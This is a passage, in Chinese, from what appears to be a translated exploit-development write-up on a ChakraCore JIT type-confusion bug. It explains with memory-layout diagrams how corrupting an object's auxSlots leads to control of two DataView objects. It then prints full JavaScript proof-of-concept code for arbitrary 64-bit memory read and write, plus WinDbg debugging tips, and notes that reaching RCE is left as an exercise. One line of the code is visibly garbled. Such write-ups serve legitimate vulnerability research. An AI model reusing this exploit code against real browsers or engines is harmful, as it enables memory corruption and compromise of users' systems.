                                                       +--------------+
                                                       |    slot 8    | // obj.h
                                                       +--------------+
                                                       |    slot 9    | // obj.i
                                                       +--------------+
                                                       |    slot 10   | // obj.j
                                                       +--------------+
    运行之后： 
           o                      obj                        some_array
    +--------------+   +--->+--------------+        +->+---------------------+
    |    vtable    |   |    |    vtable    | //o.a  |  |       vtable        | // obj.a
    +--------------+   |    +--------------+        |  +---------------------+
    |     type     |   |    |     type     | //o.b  |  |        type         | // obj.b
    +--------------+   |    +--------------+        |  +---------------------+
    |   auxSlots   +---+    |   auxSlots   +-//o.c--+  |      auxSlots       | // obj.c
    +--------------+        +--------------+           +---------------------+
    |  objectArray |        |  objectArray |           |     objectArray     | // obj.d
    +--------------+        +--------------+           |- - - - - - - - - - -|
                                                       |      arrayFlags     |
                                                       |  arrayCallSiteIndex |
                                                       +---------------------+
                                                       |       length        | // obj.e
                                                       +---------------------+
                                                       |        head         | // obj.f
                                                       +---------------------+
                                                       |    segmentUnion     | // obj.g
                                                       +---------------------+
                                                       |        ....         |
                                                       +---------------------+
现在，执行obj.e=0xFFFFFFFF实际上将替换"some_array"对象的长度字段。但是，如问题3中所述，该值不会按原样写入，而是以"包装后"的形式写入。即使我们忽略问题3，问题4-5仍然会使我们所选择的对象无效。因此，我们应该选择另一个破坏的对象。Bruno巧妙地在漏洞利用代码中选择使用ArrayBuffer对象，但不幸的是，在提交CF71A962C1CE0905A12CB3C8F23B6A37987E68DF时，ArrayBuffer对象的内存布局已经发生了更改。它不再指向数据缓冲区，而是通过BufferContent字段指向名为RefCountedBuffer的中间结构，并且只有该结构指向实际数据。因此，我们需要一种不同的解决方案。
最终，我们想到了破坏DataView对象的方法，该对象实际上在内部使用了ArrayBuffer。因此，它与使用ArrayBuffer时具有类似的优点，它也直接指向ArrayBuffer的底层数据缓冲区！下面是使用ArrayBuffer初始化的DataView对象的内存布局（dv
= new DataView(new ArrayBuffer(0x100));）：
如我们所见，DataView对象指向的是ArrayBuffer对象。而ArrayBuffer则指向前面提到的RefCountedBuffer对象，然后，该对象指向内存中的实际数据缓冲区。但是，如前所述，DataView对象也直接指向实际的数据缓冲区！
如果我们用自己的指针覆盖DataView对象的缓冲区字段，我们实际上可以根据需要实现所需的绝对读写原语。所以，我们的障碍只剩下问题3——我们不能使用损坏的DynamicObject在内存中按原样写入数字（标记型数字……)。但是现在，由于DataView对象允许我们在其指向的缓冲区上按原样写入数字（有关详细信息，请参见[DataView“API”](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/DataView#Methods
"DataView“API”")），我们可以再次借鉴Bruno的思路，使用两个DataView对象，其中第一个对象指向第二个对象，并按照我们希望的方式来破坏它。这样，就能解决了最后一个问题，并获得了梦寐以求的绝对R\W原语。
让我们回顾一下整个利用过程，具体见下面的图示和说明(这里省略了我们不感兴趣的对象)：
  1. 触发将"o"对象的auxSlots设置为“obj”对象（opt(o, cons, obj);）的漏洞。
  2. 使用“o”对象将“obj”对象的auxSlots设置为第一个DataView（o.c = dv1;）。
  3. 使用“obj”对象将第一个DataView (‘dv1’) 的缓冲区字段设置为下一个DataView对象(obj.h = dv2;）。
  4. 使用第一个DataView对象“dv1”将第二个DataView对象“dv2”的缓冲区字段精确设置为指定的地址(dv1.setUint32(0x38, 0xDEADBEEF, true); dv1.setUint32(0x3C, 0xDEADBEEF, true);）。大家请注意观察这里是如何将所选地址(0xDEADBEEFDEADBEEF)写入“dv2”缓冲区字段的精确偏移量(0x38)的。
  5. 使用第二个DataView对象(“dv2”)读写指定的地址(dv2.getUint32(0, true); dv2.getUint32(4, true);）。
  6. 对于要执行的每个读写操作，我们都要重复步骤4和5。
下面是完整的R\W原语代码：
    // commit 331aa3931ab69ca2bd64f7e020165e693b8030b5
    obj = {}
    obj.a = 1;
    obj.b = 2;
    obj.c = 3;
    obj.d = 4;
    obj.e = 5;
    obj.f = 6;
    obj.g = 7;
    obj.h = 8;
    obj.i = 9;
    obj.j = 10;
    dv1 = new DataView(new ArrayBuffer(0x100));
    dv2 = new DataView(new ArrayBuffer(0x100));
    BASE = 0x100000000;
    function hex(x) {
        return "0x" + x.toString(16);
    }
    function opt(o, c, value) {
        o.b = 1;
        class A extends c {}
        o.a = value;
    }
    function main() {
        for (let i = 0; i auxSlots = obj (Step 1)
        o.c = dv1; // obj->auxSlots = dv1 (Step 2)
        obj.h = dv2; // dv1->buffer = dv2 (Step 3)
        let read64 = function(addr_lo, addr_hi) {
            // dv2->buffer = addr (Step 4)
            dv1.setUint32(0x38, addr_lo, true);
            dv1.setUint32(0x3C, addr_hi, true);
            // read from addr (Step 5)
            return dv2.getInt32(0, true) + dv2.getInt32(4, true) * BASE;
        }
        let write64 = function(addr_lo, addr_hi, value_lo, value_hi) {
            // dv2->buffer = addr (Step 4)
            dv1.setUint32(0x38, addr_lo, true);
            dv1.setUint32(0x3C, addr_hi, true);
            // write to addr (Step 5)
            dv2.setInt32(0, value_lo, true);
            dv2.setInt32(0, value_hi, true);
        }
        // get dv2 vtable pointer
        vtable_lo = dv1.getUint32(0, true);
        vtable_hi = dv1.getUint32(4, true);
        print(hex(vtable_lo + vtable_hi * BASE));
        // read first vtable entry using the R\W primitive
        print(hex(read64(vtable_lo, vtable_hi)));
        // write a value to address 0x1111111122222222 using the R\W primitive (this will crash)
        write64(0x22222222, 0x11111111, 0x1337, 0x1337);
    }
    main();
注意:如果您想自己调试代码（例如，在WindBG中），一个非常方便的方法是使用“instruments”中断JS代码中感兴趣的行。为此，请参阅以下两个有用的示例：
  * 在ch!WScriptJsrt::EchoCallback上设置断点，以在执行print();时停下来。
  * 在chakracore!Js::DynamicTypeHandler::SetSlotUnchecked上设置断点，以便解释器在执行为DynamicObject属性赋值的语句前停下来。这对于了解JavaScript对象(“o”和“obj”)如何损坏内存中的其他对象非常有用。
当然，您可以将两者结合使用，就能轻松地浏览整个利用代码了。
## 小结
本文中，我们详细介绍了如何使用DynamicObject
auxSlots的JIT损坏来最终获得完整的R\W原语。在这里，我们必须使用损坏的对象来进一步破坏其他感兴趣的对象——特别是两个DataView对象，其中第一个会精确地破坏第二个，以控制原语的选择地址。同时，我们还必须设法绕过使用javascript的DynamicObject“API”强加的一些限制和问题。最后，需要注意的是，获取完整的R\W原语只是利用该漏洞的第一步。攻击者仍然需要重定向执行流，以获得完整的RCE。然而，这已经超出了本文的范围，或者，也可以看作是留给读者的作业。